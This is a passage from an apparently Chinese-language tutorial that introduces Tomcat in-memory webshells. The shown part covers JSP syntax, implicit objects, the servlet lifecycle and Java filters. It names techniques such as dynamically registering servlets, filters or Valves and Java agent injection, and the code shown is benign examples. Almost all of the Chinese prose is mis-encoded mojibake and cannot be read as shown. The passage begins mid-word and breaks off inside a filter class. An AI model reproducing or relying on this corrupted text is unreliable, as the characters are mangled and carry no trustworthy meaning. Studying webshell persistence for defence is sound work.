æŠ€æœ¯ã€‚\nwebshellå®é™…ä¸Šä¹Ÿæ˜¯ä¸€ç§webæœåŠ¡ï¼Œé‚£ä¹ˆä»åˆ›å»ºwebæœåŠ¡çš„è§’åº¦æ¥çœ‹ï¼Œæœ‰ä¸‹é¢å‡ ç§æ‰‹æ®µå’Œæ€è·¯ï¼š\nåŠ¨æ€æ³¨å†Œ servlet/filter/listenerï¼ˆä½¿ç”¨ servlet-apiçš„å…·ä½“å®ç°ï¼‰ åŠ¨æ€æ³¨å†Œ interceptor/controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚ spring/struts2ï¼‰ åŠ¨æ€æ³¨å†Œä½¿ç”¨èŒè´£é“¾è®¾è®¡æ¨¡å¼çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆä¾‹å¦‚ Tomcat çš„ Pipeline \u0026amp; Valveï¼ŒGrizzly çš„ FilterChain \u0026amp; Filterç­‰ç­‰ï¼‰ ä½¿ç”¨ java agent æŠ€æœ¯å†™å…¥å­—èŠ‚ç  Tomcatå†…å­˜é©¬ä¹Ÿæ˜¯ç»å¸¸ç”¨çš„ã€‚\nåŸºç¡€çŸ¥è¯† JSP åœ¨å­¦ä¹ å†…å­˜é©¬ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹jspæŠ€æœ¯ã€‚\nJSPå…¨åä¸ºJava Server Pagesï¼Œæ˜¯ä¸€ç§åŠ¨æ€ç½‘é¡µå¼€å‘æŠ€æœ¯ï¼Œå…¶æ ¹æœ¬æ˜¯ä¸€ä¸ªç®€åŒ–çš„Serrvletè®¾è®¡ï¼Œå®ƒæ˜¯åœ¨ä¼ ç»Ÿçš„ç½‘é¡µHTMLä¸­æ’å…¥javaç¨‹åºæ®µå’ŒJSPæ ‡è®°ï¼Œä»è€Œè®©å½¢æˆJSPæ–‡ä»¶ï¼ˆ.jspï¼‰ï¼Œåœ¨å¸¸è§æ¡†æ¶ä¸­ï¼Œé€šå¸¸æ˜¯åœ¨tomcatä¸­æœ‰æ‰€ä½¿ç”¨ï¼Œä½†æ€»çš„æ¥è¯´jspç°åœ¨ä¸æ˜¯éå¸¸å¸¸è§äº†ã€‚\nè¯­æ³• è„šæœ¬ç¨‹åº è„šæœ¬ç¨‹åºå¯ä»¥åŒ…å«ä»»æ„é‡çš„Javaè¯­å¥ã€å˜é‡ã€æ–¹æ³•æˆ–è¡¨è¾¾å¼ï¼Œè¯­æ³•æ ¼å¼ä¸ºï¼š\n1 \u0026lt;% ä»£ç ç‰‡æ®µ %\u0026gt; ç®€å•ç»™ä¸€ä¸ªjspç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% out.println(\u0026#34;æˆåŠŸè°ƒç”¨è„šæœ¬ç¨‹åº\u0026#34;); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; JSPå£°æ˜ ä¸€ä¸ªå£°æ˜è¯­å¥å¯ä»¥å£°æ˜ä¸€ä¸ªæˆ–å¤šä¸ªå˜é‡ã€æ–¹æ³•ï¼Œä¾›åé¢çš„Javaä»£ç ä½¿ç”¨ã€‚åœ¨JSPæ–‡ä»¶ä¸­ï¼Œéœ€è¦å…ˆå£°æ˜è¿™äº›å˜é‡å’Œæ–¹æ³•æ‰èƒ½ä½¿ç”¨å®ƒä»¬ã€‚\nJSPå£°æ˜çš„è¯­æ³•æ ¼å¼ï¼š\n1 \u0026lt;%! declared; %\u0026gt; ç­‰ä»·äºä¸‹é¢çš„XMLè¯­å¥ï¼š\n1 2 3 \u0026lt;jsp:declaration\u0026gt; ä»£ç ç‰‡æ®µ \u0026lt;/jsp:declaration\u0026gt; æ¯”å¦‚ï¼š\n1 \u0026lt;%! int i = 0; %\u0026gt; JSPè¡¨è¾¾å¼ ä¸€ä¸ªJSPè¡¨è¾¾å¼ä¸­åŒ…å«çš„è„šæœ¬è¯­è¨€è¡¨è¾¾å¼ï¼Œå…ˆè¢«è½¬åŒ–æˆStringï¼Œç„¶åæ’å…¥åˆ°è¡¨è¾¾å¼å‡ºç°çš„åœ°æ–¹ã€‚\nç”±äºè¡¨è¾¾å¼çš„å€¼ä¼šè¢«è½¬åŒ–æˆStringï¼Œæ‰€ä»¥å¯ä»¥åœ¨ä¸€ä¸ªæ–‡æœ¬è¡Œä¸­ä½¿ç”¨è¡¨è¾¾å¼è€Œä¸ç”¨ç®¡å®ƒæ˜¯å¦æ˜¯HTMLæ ‡ç­¾ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¡¨è¾¾å¼å…ƒç´ ä¸­å¯ä»¥åŒ…å«ä»»ä½•Javaè¯­è¨€ï¼Œä½†æ˜¯ä¸èƒ½ç”¨åˆ†å·æ¥ç»“æŸè¡¨è¾¾å¼ã€‚\nè¯­æ³•æ ¼å¼ï¼š\n1 \u0026lt;%= è¡¨è¾¾å¼ %\u0026gt; ç­‰ä»·äºä¸‹é¢çš„XMLè¡¨è¾¾å¼ï¼š\n1 \u0026lt;jsp:expression\u0026gt; è¡¨è¾¾å¼\u0026lt;/jsp:expression\u0026gt; ç¤ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt; ä»Šå¤©çš„æ—¥æœŸæ˜¯: \u0026lt;%= (new java.util.Date()).toLocaleString()%\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; é¡µé¢ä¸ºï¼š æ‰€ä»¥æƒ³è¦åœ¨é¡µé¢ä¸Šæœ‰å›æ˜¾å¯ä»¥ä½¿ç”¨è„šæœ¬ç¨‹åºæˆ–è€…è¡¨è¾¾å¼ã€‚\nJSPæ³¨é‡Š JSPæ³¨é‡Šä¸»è¦æœ‰ä¸¤ä¸ªä½œç”¨ï¼šä¸ºä»£ç ä½œæ³¨é‡Šä»¥åŠå°†æŸæ®µä»£ç æ³¨é‡Šæ‰ã€‚\nè¯­æ³•ï¼š\n1 \u0026lt;%--æ³¨é‡Š--%\u0026gt; è¿™æ ·æ³¨é‡Šå†…å®¹å°±ä¸ä¼šè¢«å‘é€è‡³æµè§ˆå™¨å¹¶ä¸”ä¸ä¼šè¢«ç¼–è¯‘ã€‚\nJSPæŒ‡ä»¤ JSPæŒ‡ä»¤ç”¨æ¥è®¾ç½®æ•´ä¸ªJSPé¡µé¢ç›¸å…³çš„å±æ€§ï¼Œå¦‚ç½‘é¡µç¼–ç æ–¹å¼å’Œè„šæœ¬è¯­è¨€ã€‚\nè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n1 \u0026lt;%@ directive attribute=\u0026#34;value\u0026#34; %\u0026gt; æŒ‡ä»¤å¯ä»¥æœ‰å¾ˆå¤šæ ¼å±æ€§ï¼Œå®ƒä»¬ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜åœ¨ï¼Œå¹¶ç”¨é€—å·éš”å¼€ã€‚\nJSPä¸­çš„ä¸‰ç§æŒ‡ä»¤æ ‡ç­¾ï¼š\næŒ‡ä»¤ æè¿° \u0026lt;%@ page .. %\u0026gt; å®šä¹‰ç½‘é¡µä¾èµ–å±æ€§ï¼Œæ¯”å¦‚è„šæœ¬è¯­è¨€ã€erroré¡µé¢ã€ç¼“å­˜éœ€æ±‚ç­‰ç­‰ \u0026lt;%@ include \u0026mdash; %\u0026gt; åŒ…å«å…¶ä»–æ–‡ä»¶ \u0026lt;%@ taglib \u0026hellip; %\u0026gt; å¼•å…¥æ ‡ç­¾åº“çš„å®šä¹‰ ç®€å•è¯´è¯´includeæŒ‡ä»¤ï¼ŒJSPå¯ä»¥é€šè¿‡includeæŒ‡ä»¤æ¥åŒ…å«å…¶ä»–æ–‡ä»¶ã€‚è¢«åŒ…å«çš„æ–‡ä»¶å¯ä»¥æ˜¯JSPæ–‡ä»¶ã€HTMLæ–‡ä»¶æˆ–æ–‡æœ¬æ–‡ä»¶ã€‚åŒ…å«çš„æ–‡ä»¶å°±å¥½åƒæ˜¯è¯¥JSPæ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œä¼šè¢«åŒæ—¶ç¼–è¯‘æ‰§è¡Œã€‚\nincludeæŒ‡ä»¤çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n1 \u0026lt;%@ include file=\u0026#34;æ–‡ä»¶ç›¸å¯¹ url åœ°å€\u0026#34; %\u0026gt; ç­‰ä»·çš„XMLè¯­æ³•ï¼š\n1 \u0026lt;jsp:directive.include file=\u0026#34;æ–‡ä»¶ç›¸å¯¹ url åœ°å€\u0026#34; /\u0026gt; ç­‰å¯å‚è€ƒï¼šhttps://www.runoob.com/jsp/jsp-directives.htmlï¼Œè¿˜æ˜¯å¾ˆæœ‰æƒ³æ³•çš„ã€‚\nJSPéšå¼å¯¹è±¡ JSPéšå¼å¯¹è±¡æ—¶JSPå®¹å™¨ä¸ºæ¯ä¸ªé¡µé¢æä¾›çš„Javaå¯¹è±¡ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒä»¬è€Œä¸ç”¨æ˜¾ç¤ºå£°æ˜ã€‚JSPéšå¼å¯¹è±¡ä¹Ÿè¢«ç§°ä¸ºé¢„å®šä¹‰å˜é‡ï¼ŒJSPæ‰€æ”¯æŒçš„ä¹å¤§éšå¼å¯¹è±¡ï¼š\n1 2 3 4 5 6 7 8 9 requestï¼šHttpServletRequestæ¥å£çš„å®ä¾‹ responseï¼šHttpServletResponse æ¥å£çš„å®ä¾‹ outï¼šJspWriteç±»çš„å®ä¾‹ï¼Œç”¨äºæŠŠç»“æœè¾“å‡ºè‡³ç½‘é¡µä¸Š sessionï¼šHttpSessionç±»çš„å®ä¾‹ applicationï¼šServletContextç±»çš„å®ä¾‹ configï¼šServletConfigç±»çš„å®ä¾‹ pageContextï¼šPageContextç±»çš„å®ä¾‹ï¼Œæä¾›å¯¹JSPé¡µé¢æ‰€æœ‰å¯¹è±¡ä»¥åŠå‘½ä»¤ç©ºé—´çš„è®¿é—® pageï¼šç±»ä¼¼ä¸javaä¸­çš„thiså…³é”®å­— Exceptionï¼šExceptionç±»çš„å¯¹è±¡ï¼Œä»£è¡¨å‘ç”Ÿé”™è¯¯çš„JSPé¡µé¢ä¸­å¯¹åº”çš„å¼‚å¸¸å¯¹è±¡ è¯¦ç»†è¯´æ˜ï¼Œæ¯”å¦‚\nrequestå¯¹è±¡æä¾›äº†ä¸€ç³»åˆ—æ–¹æ³•æ¥è·å–HTTPå¤´ä¿¡æ¯ï¼Œcookiesï¼ŒHTTPæ–¹æ³•ç­‰ï¼ŒæœåŠ¡ç«¯éœ€è¦é€šè¿‡requestå¯¹è±¡æ‹¿åˆ°éœ€è¦çš„æ•°æ®ï¼Œç„¶ååšå‡ºå“åº”ã€‚ å¸¸ç”¨æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;% request.setAttribute(\u0026#34;name\u0026#34;,\u0026#34;fupanc\u0026#34;);\t//å¾€requestå¯¹è±¡ä¸­å­˜å‚¨ä¸€ä¸ªå€¼ key-valueçš„å½¢å¼ request.setCharacterEncoding(\u0026#34;utf-8\u0026#34;);\t//è®¾ç½®ç¼–ç æ ¼å¼ request.getParameter(\u0026#34;\u0026#34;);//è·å–æäº¤çš„æŒ‡å®šå‚æ•°çš„å€¼ request.getParameterNames();//è¿”å›è¯·æ±‚ä¸­æ‰€æœ‰å‚æ•°çš„é›†åˆ request.getParameterValues(\u0026#34;\u0026#34;);//è·å–åŒ…å«æŒ‡å®šå‚æ•°çš„æ‰€æœ‰å€¼çš„æ•°ç»„ request.getAttributeNames();//è·å–æ‰€æœ‰å±æ€§åç§°é›†åˆ request.getAttribute(\u0026#34;name\u0026#34;);//è·å–æŒ‡å®šå±æ€§çš„å±æ€§å€¼,å¦‚æœä¸å­˜åœ¨è¿”å›null request.getCharacterEncoding();//è·å–ç¼–ç æ ¼å¼ request.getProtocol();//è·å–HTTPä½¿ç”¨çš„åè®® request.getServletPath();//è·å–ç”¨æˆ·æäº¤ä¿¡æ¯çš„é¡µé¢çš„è·¯å¾„ request.getMethod();//è·å–ç”¨æˆ·æäº¤çš„æ–¹å¼ï¼ˆGET/POST ç­‰ï¼‰ request.getHeaderNames();//è¿”å›æ‰€æœ‰HTTPå¤´çš„åç§°é›†åˆ request.getHeader(\u0026#34;\u0026#34;);//è·å–headerä¸­æŒ‡å®šå±æ€§çš„å€¼ request.getRemoteAddr();//è·å–ç”¨æˆ·çš„ipåœ°å€ request.getRemoteHost();//è·å–ç”¨æˆ·çš„ä¸»æœºå request.getServerName();//è·å–æœåŠ¡å™¨çš„åç§° request.getServerPort();//è·å–æœåŠ¡å™¨ç«¯å£å· request.getCookies();//è¿”å›å®¢æˆ·ç«¯æ‰€æœ‰çš„Cookieçš„æ•°ç»„ request.getSession();//è¿”å›requestå¯¹åº”çš„sessionå¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™åˆ›å»ºä¸€ä¸ª request.getInputStream();//è¿”å›è¯·æ±‚çš„è¾“å…¥æµ request.getContextPath();//è¿”å›request URIä¸­æŒ‡æ˜çš„ä¸Šä¸‹æ–‡è·¯å¾„ request.getRequestDispatcher(\u0026#34;result.jsp\u0026#34;).forward(request,response);//è¯·æ±‚è½¬å‘ %\u0026gt; responseå¯¹è±¡å¯¹åº”ç€httpè¯·æ±‚çš„å“åº”ï¼Œå…¶å°è£…äº†å“åº”ä½“çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡responseå¯¹è±¡å‘å®¢æˆ·ç«¯è¿”å›æ•°æ®ã€‚ å¸¸ç”¨æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 response.getOutputStream();//è¿”å›ä¸€ä¸ªå“åº”äºŒè¿›åˆ¶çš„è¾“å‡ºæµ response.getWrite();//è¿”å›å¯ä»¥è¾“å‡ºå­—ç¬¦çš„å¯¹è±¡ response.sendRedirect(\u0026#34;\u0026#34;);//é¡µé¢é‡å®šå‘ response.setContextLength(1000);//è®¾ç½®å“åº”å¤´é•¿åº¦ response.setContentType(\u0026#34;text/html; charset=utf-8\u0026#34;);//è®¾ç½®å“åº”çš„MIMEç±»å‹ response.getCharacterEncoding();//è·å–ç¼–ç æ ¼å¼ response.addCookie(new Cookie(\u0026#34;\u0026#34;,\u0026#34;\u0026#34;));//æ·»åŠ Cookie response.setHeader(\u0026#34;Content-Disposition\u0026#34;,\u0026#34;attachment; filename=fileName\u0026#34;);//é…ç½®headerï¼Œè¡¨ç¤ºæµè§ˆå™¨å·²ä¸‹è½½çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶ response.setStatus(200);//è®¾ç½®å“åº”ç  sessionå¯¹è±¡ç”¨æ¥è·Ÿè¸ªåœ¨å„ä¸ªåˆ»ç”»æ®µè¯·æ±‚é—´çš„ä¼šè¯ã€‚ sessionä¸»è¦ç”¨äºä¼šè¯è·Ÿè¸ªï¼Œå¯ä»¥ç”¨æ¥å…±äº«æ•°æ®ï¼Œä¾‹å¦‚ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ç­‰ç­‰ã€‚\nä¸€æ¬¡ä¼šè¯å¯èƒ½åŒ…å«å¯¹æ­¤requestå’Œresponseã€‚\nå¸¸ç”¨æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 \u0026lt;% session.setAttribute(\u0026#34;name\u0026#34;, \u0026#34;yzq\u0026#34;); session.setAttribute(\u0026#34;age\u0026#34;, 25); session.getCreationTime();//è·å–åˆ›å»ºæ—¶é—´ session.getId();//è·å–sessionid session.invalidate();//å–æ¶ˆsessionï¼Œä½¿sessionä¸å¯ç”¨ session.removeAttribute(\u0026#34;name\u0026#34;);//ç§»é™¤æŸä¸ªå±æ€§ %\u0026gt; outå¯¹è±¡ç”¨äºåœ¨responseå¯¹è±¡ä¸­å†™å…¥å†…å®¹ï¼Œæœ‰å¦‚ä¸‹æ–¹æ³•ç”¨æ¥è¾“å‡ºï¼š æ–¹æ³• æè¿° out.print(data Type dt) è¾“å‡ºTypeç±»å‹çš„å€¼ out.println(data Type dt) è¾“å‡ºTypeç±»å‹çš„å€¼ç„¶åæ¢è¡Œ out.flush() åˆ·æ–°è¾“å‡ºæµ ç­‰\nè¿˜æœ‰çš„å…¶ä»–JSPæŠ€æœ¯å‚è€ƒèœé¸Ÿæ•™ç¨‹çš„ï¼šhttps://www.runoob.com/jsp/jsp-tutorial.html\nTomcatæ¶æ„å­¦ä¹  å­¦ä¹ Tomcatå†…å­˜é©¬ï¼Œè‡ªç„¶éœ€è¦å­¦ä¹ Tomcatæ¶æ„ã€‚\nJava Webä¸‰å¤§ä»¶ Java Webä¸‰å¤§ä»¶ï¼šServletï¼ŒFilterï¼ŒListenerã€‚\nå½“Tomcatçš„webåº”ç”¨ç¨‹åº æ¥æ”¶åˆ°è¯·æ±‚çš„æ—¶å€™ï¼Œä¾æ¬¡ä¼šç»è¿‡ Listener -\u0026gt; Filter -\u0026gt; Servlet\nServlet Java Servlet æ˜¯è¿è¡Œåœ¨WebæœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„å°å‹Javaç¨‹åºï¼Œä¸€èˆ¬æ˜¯ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚çš„åŠ¨æ€èµ„æºã€‚\nè¯·æ±‚çš„å¤„ç†è¿‡ç¨‹ å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼Œæ¯”å¦‚getç±»å‹ Servlet å®¹å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ ¹æ®è¯·æ±‚ä¿¡æ¯ï¼Œå°è£…æˆ HttpServletRequest å’Œ HttpServletResponse å¯¹è±¡ã€‚ Servlet å®¹å™¨è°ƒç”¨ HttpServlet çš„ init()æ–¹æ³•ï¼Œinitæ–¹æ³•åªåœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™è¢«è°ƒç”¨ã€‚ Servlet å®¹å™¨è°ƒç”¨ service() æ–¹æ³• service() æ–¹æ³•æ ¹æ®è¯·æ±‚ç±»å‹ï¼Œåˆ†åˆ«è°ƒç”¨doGetæˆ–è€…doPostæ–¹æ³•ã€‚ doXXXæ–¹æ³•ä¸­æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰çš„ä¸šåŠ¡é€»è¾‘ã€‚ ä¸šåŠ¡é€»è¾‘å¤„ç†å®Œæˆä¹‹åï¼Œè¿”å›ç»™Servlet å®¹å™¨ï¼Œç„¶åå®¹å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ å®¹å™¨å…³é—­æ—¶å€™ï¼Œä¼šè°ƒç”¨ destory æ–¹æ³•ã€‚ ä»¥ä¸Šæµç¨‹å¯ä»¥ç”¨å¦‚ä¸‹å›¾ç‰‡æ¥è¯´æ˜ï¼š\néœ€è¦æ³¨æ„çš„æ˜¯ï¼šæ¯æ¬¡å¯åŠ¨tomcatæ‰ä¼šåˆå§‹åŒ–Servletå®¹å™¨ï¼Œè€Œæ¯æ¬¡å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚éƒ½ä¼šå®ä¾‹åŒ–ä¸€ä¸ªServletå®ä¾‹ï¼ˆservlet å®ä¾‹é€šå¸¸åªç”Ÿæˆä¸€æ¬¡ï¼ˆæˆ–æŒ‰é…ç½®ç­–ç•¥ç”Ÿæˆï¼‰ï¼Œç„¶åè¢«å®¹å™¨å¤ç”¨ï¼‰ï¼Œæ¯æ¬¡è¯·æ±‚æ—¶ï¼Œå®¹å™¨ä¼šè°ƒç”¨ Servlet å®ä¾‹çš„ service() æ–¹æ³•æ¥å¤„ç†è¯·æ±‚ï¼Œå†çœ‹æ˜¯è°ƒç”¨åç«¯å®ç°çš„doGet()è¿˜æ˜¯doPost()ç­‰ï¼Œåç«¯çš„æ‰§è¡Œä»£ç ä¼šå°†æ‰§è¡Œç»“æœå†è¿”å›ç»™servletå®¹å™¨ï¼Œå®¹å™¨å†è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œç”±æ­¤æ˜¯ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ã€‚\næ¯”å¦‚å°±å¯ä»¥ç”¨å¦‚ä¸‹ä»£ç æ¥è‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(\u0026#34;/TestServlet\u0026#34;) public class TestServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException { response.getWriter().write(\u0026#34;hello Drunbaby\u0026#34;); } @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } } å½“GETè¯·æ±‚/TestServletæ—¶ï¼Œtomcatå°±ä¼šæ ¹æ® URL /TestServlet æ‰¾åˆ°å¯¹åº”çš„ Servletï¼ˆé€šè¿‡ @WebServlet æ³¨è§£æˆ– web.xml é…ç½®æ˜ å°„ï¼‰ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å®ç°çš„ä»£ç ï¼Œæœ€åå¯ä»¥å®ç°æ§åˆ¶responseã€‚\nservlet ç”Ÿå‘½å‘¨æœŸ æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼ˆweb.xml ä¸­é…ç½® load-on-startup=1ï¼Œé»˜è®¤ä¸º0ï¼‰æˆ–è€…ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥servletæ—¶ï¼Œæœºä¼šåˆå§‹åŒ–ä¸€ä¸ª Servlet å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œåˆå§‹åŒ–æ–¹æ³• init(ServletConfig conf)ã€‚ servlet å¯¹è±¡å»å¤„ç†æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚ï¼Œåœ¨ service(ServletRequest reqï¼ŒServletResponse res)æ–¹æ³•ä¸­æ‰§è¡Œ æœåŠ¡å™¨å…³é—­æ—¶ï¼Œé”€æ¯è¿™ä¸ª servlet å¯¹è±¡ï¼Œæ‰§è¡Œ destory() æ–¹æ³•ã€‚ ç”± JVMè¿›è¡Œåƒåœ¾å›æ”¶ã€‚ Filter filter ä¹Ÿç§°ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯å¯¹ Servlet æŠ€æœ¯çš„ä¸€ä¸ªå¼ºè¡¥å……ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯å¯¹webèµ„æºè¿›è¡Œæ‹¦æˆªï¼Œåšä¸€äº›å¤„ç†åå†äº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ–servletå¤„ç†ã€‚é€šå¸¸éƒ½æ˜¯ç”¨æ¥æ‹¦æˆªrequestè¿›è¡Œå¤„ç†ï¼Œä¹Ÿå¯ä»¥å¯¹è¿”å›çš„responseè¿›è¡Œæ‹¦æˆªå¤„ç†ã€‚\nå·¥ä½œåŸç†å¦‚å›¾ï¼š åŸºæœ¬å·¥ä½œåŸç† Filter ç¨‹åºæ˜¯ä¸€ä¸ªå®ç°äº†ç‰¹æ®Šæ¥å£çš„Javaç±»ï¼Œä¸Servlet ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”±Servletå®¹å™¨è¿›è¡Œè°ƒç”¨å’Œæ‰§è¡Œçš„ å½“åœ¨ web.xml æ³¨å†Œäº†ä¸€ä¸ªFilter æ¥å¯¹æŸä¸ªServletç¨‹åºè¿›è¡Œæ‹¦æˆªå¤„ç†æ—¶ï¼Œå®ƒå¯ä»¥å†³å®šæ˜¯å¦å°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™Servlet ç¨‹åºï¼Œä»¥åŠå¯¹è¯·æ±‚å’Œå“åº”æ¶ˆæ¯æ˜¯å¦è¿›è¡Œä¿®æ”¹ã€‚ å½“ Servlet å®¹å™¨å¼€å§‹è°ƒç”¨æŸä¸ª Servlet ç¨‹åºæ—¶ï¼Œå¦‚æœå‘ç°å·²ç»æ³¨å†Œäº†ä¸€ä¸ª Filter ç¨‹åºæ¥å¯¹è¯¥ Servlet è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå®¹å™¨ä¸å†ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ Filter çš„ doFilter æ–¹æ³•ï¼Œå†ç”± doFilter æ–¹æ³•å†³å®šæ˜¯å¦å»æ¿€æ´» service æ–¹æ³•ã€‚ ä½†åœ¨ Filter.doFilter æ–¹æ³•ä¸­ä¸èƒ½ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ FilterChain.doFilter æ–¹æ³•æ¥æ¿€æ´»ç›®æ ‡ Servlet çš„ service æ–¹æ³•ï¼ŒFilterChain å¯¹è±¡æ˜¯é€šè¿‡ Filter.doFilter æ–¹æ³•çš„å‚æ•°ä¼ é€’è¿›æ¥çš„ã€‚ åªè¦åœ¨ Filter.doFilter æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter æ–¹æ³•çš„è¯­å¥å‰åå¢åŠ æŸäº›ç¨‹åºä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Servlet è¿›è¡Œå“åº”å‰åå®ç°æŸäº›ç‰¹æ®ŠåŠŸèƒ½ã€‚ å¦‚æœåœ¨ Filter.doFilter æ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨ FilterChain.doFilter æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ Servlet çš„ service æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œï¼Œè¿™æ ·é€šè¿‡ Filter å°±å¯ä»¥é˜»æ­¢æŸäº›éæ³•çš„è®¿é—®è¯·æ±‚ã€‚ Filterçš„ç”Ÿå‘½å‘¨æœŸ ä¸ servlet ä¸€æ ·ï¼ŒFilter çš„åˆ›å»ºå’Œé”€æ¯ä¹Ÿç”± Web å®¹å™¨è´Ÿè´£ã€‚Web åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼ŒWeb æœåŠ¡å™¨å°†åˆ›å»º Filter çš„å®ä¾‹å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ init() æ–¹æ³•ï¼Œè¯»å– web.xml é…ç½®ï¼Œå®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–åŠŸèƒ½ï¼Œä»è€Œä¸ºåç»­çš„ç”¨æˆ·è¯·æ±‚ä½œå¥½æ‹¦æˆªçš„å‡†å¤‡å·¥ä½œï¼ˆfilter å¯¹è±¡åªä¼šåˆ›å»ºä¸€æ¬¡ï¼Œinit æ–¹æ³•ä¹Ÿåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼‰ã€‚å¼€å‘äººå‘˜é€šè¿‡initæ–¹æ³•çš„å‚æ•°ï¼Œå¯è·å¾—ä»£è¡¨å½“å‰filteré…ç½®ä¿¡æ¯çš„FilterConfigå¯¹è±¡ã€‚\nFilter å¯¹è±¡åˆ›å»ºåä¼šé©»ç•™åœ¨å†…å­˜ï¼Œå½“ Web åº”ç”¨ç§»é™¤æˆ–æœåŠ¡å™¨åœæ­¢æ—¶æ‰é”€æ¯ï¼Œå³ä¼šæ‰§è¡Œdestroyæ–¹æ³•ã€‚åœ¨ Web å®¹å™¨å¸è½½ Filter å¯¹è±¡ä¹‹å‰è¢«è°ƒç”¨ã€‚è¯¥æ–¹æ³•åœ¨ Filter çš„ç”Ÿå‘½å‘¨æœŸä¸­ä»…æ‰§è¡Œä¸€æ¬¡ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥é‡Šæ”¾è¿‡æ»¤å™¨ä½¿ç”¨çš„èµ„æºã€‚\nå¯ä»¥ç”¨ä¸‹ä»£ç è‡ªå®šä¹‰Filterï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 package org.example; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebFilter(\u0026#34;/admin/*\u0026#34;) public class Testfilter implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;Testfilter init\u0026#34;); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse resp = (HttpServletResponse) servletResponse; HttpSession session = request.getSession(false); if (session == null) { 